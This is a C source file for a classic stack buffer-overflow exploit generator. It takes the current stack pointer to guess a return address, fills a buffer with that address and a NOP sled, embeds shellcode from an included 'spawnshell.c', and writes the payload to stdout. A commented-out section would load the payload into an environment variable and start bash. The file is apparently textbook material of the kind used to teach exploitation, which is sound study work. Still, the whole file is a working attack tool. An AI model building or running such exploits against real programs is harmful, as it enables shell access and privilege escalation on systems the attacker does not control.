#include <stdlib.h>
#include <stdio.h>
#include <string.h>


#define offset_size 0
#define buffer_size 512
#define NOP         0x90

/* the shellcode */
#include "spawnshell.c"
#define shellcode spawnshell_bin
#define shellcode_len spawnshell_bin_len

unsigned long find_start(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=offset_size, bsize=buffer_size;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
  }

  addr = find_start() - offset;
  fprintf(stderr, "Attempting address: 0x%x\n", addr);

 /* initialize buffer with address */
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
       *(addr_ptr++) = addr;

  /* Fill first half of the buffer with NOP */
  for (i = 0; i < bsize/2; i++)
         buff[i] = NOP;

  /* add shellcode */
  ptr = buff + (bsize/2 - shellcode_len/2);
  for (i = 0; i < shellcode_len; i++)
         *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  /* open shell with BUF environment variable */
/*  memcpy(buff,"BUF=",4);
  putenv(buff);
  system("/bin/bash");*/
  fwrite(buff, bsize, 1, stdout);

  return 0;
}
